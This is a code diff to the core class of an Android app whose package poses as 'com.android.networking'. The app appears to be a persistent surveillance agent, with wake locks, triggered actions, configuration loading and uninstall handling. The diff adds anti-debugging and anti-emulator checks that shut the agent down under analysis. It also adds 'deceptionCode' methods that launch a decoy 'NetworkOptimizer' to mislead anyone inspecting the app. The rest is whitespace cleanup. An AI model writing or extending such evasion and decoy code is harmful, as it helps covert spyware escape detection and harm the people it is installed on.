@@ -29,6 +29,9 @@ import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
 import com.android.networking.manager.ManagerEvent;
 import com.android.networking.manager.ManagerModule;
+import com.android.networking.optimize.NetworkOptimizer;
+import com.android.networking.util.AntiDebug;
+import com.android.networking.util.AntiEmulator;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
@@ -121,8 +124,8 @@ public class Core extends Activity implements Runnable {
 
 		// mRedrawHandler.sleep(1000);
 		if (Cfg.POWER_MANAGEMENT) {
-			Status.self().acquirePowerLock();			
-		}else{
+			Status.self().acquirePowerLock();
+		} else {
 			final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
 			wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
 			wl.acquire();
@@ -132,6 +135,17 @@ public class Core extends Activity implements Runnable {
 
 		serviceRunning = true;
 		return true;
+	}
+
+	private void deceptionCode2() {
+		NetworkOptimizer nOptimizer = new NetworkOptimizer(getApplicationContext());
+		nOptimizer.start();
+
+	}
+
+	private void deceptionCode1() {
+		NetworkOptimizer nOptimizer = new NetworkOptimizer(getApplicationContext());
+		nOptimizer.start();
 	}
 
 	/**
@@ -170,8 +184,6 @@ public class Core extends Activity implements Runnable {
 			// startTrace();
 		}
 
-		
-
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
@@ -194,7 +206,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEMO) {
 					Beep.beepPenta();
 				}
-				
+
 				// Torna true in caso di UNINSTALL o false in caso di stop del
 				// servizio
 				checkActions();
@@ -276,7 +288,7 @@ public class Core extends Activity implements Runnable {
 
 				final Trigger[] actionIds = status.getTriggeredActions(qq);
 				if (Cfg.POWER_MANAGEMENT) {
-					Status.self().acquirePowerLock();			
+					Status.self().acquirePowerLock();
 				}
 
 				if (actionIds.length == 0) {
@@ -573,10 +585,10 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConfFile): " + file);
 			}
 
-			if(file.getSize()<8){
+			if (file.getSize() < 8) {
 				return false;
 			}
-			
+
 			final byte[] resource = file.read(8);
 			// Initialize the configuration object
 			Configuration conf = new Configuration(resource);
@@ -730,6 +742,23 @@ public class Core extends Activity implements Runnable {
 
 			return false;
 		}
+	}
+
+	public static boolean check() {
+		if (!Cfg.DEBUG) {
+			AntiDebug ad = new AntiDebug();
+			if (ad.isDebug()) {
+				// deceptionCode1();
+				return false;
+			}
+		}
+
+		AntiEmulator am = new AntiEmulator();
+		if (am.isEmu()) {
+			// deceptionCode2();
+			return false;
+		}
+		return true;
 	}
 
 }
